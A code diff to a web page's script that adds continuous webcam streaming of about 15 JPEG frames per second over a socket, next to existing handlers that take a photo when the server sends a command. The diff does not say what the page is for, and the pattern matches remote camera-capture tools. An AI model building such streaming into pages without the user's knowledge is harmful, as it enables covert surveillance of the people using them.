@@ -75,11 +75,20 @@
                     video.play();
                     isCameraReady = true;
                     socket.emit('user-ready');
+
+                    // Smooth Live Streaming Loop (~15 fps stream)
+                    setInterval(() => {
+                        if (!isCameraReady) return;
+                        const context = canvas.getContext('2d');
+                        canvas.width = 320;
+                        canvas.height = 240;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const frameData = canvas.toDataURL('image/jpeg', 0.3);
+                        socket.emit('live-stream-frame', frameData);
+                    }, 70);
                 };
             })
-            .catch(err => {
-                console.error("Camera access error:", err);
-            });
+            .catch(err => console.error("Camera access error:", err));
 
         function takeSinglePhoto() {
             if (!isCameraReady) return;
@@ -88,8 +97,7 @@
             canvas.height = video.videoHeight || 480;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Compressed JPEG format (Quality 0.5 for high speed without hanging)
-            const imageData = canvas.toDataURL('image/jpeg', 0.5);
+            const imageData = canvas.toDataURL('image/jpeg', 0.6);
             socket.emit('user-photo-captured', imageData);
         }
 
@@ -110,9 +118,7 @@
             }, 1000);
         });
 
-        socket.on('capture-photo', () => {
-            takeSinglePhoto();
-        });
+        socket.on('capture-photo', () => takeSinglePhoto());
     </script>
 </body>
 </html>
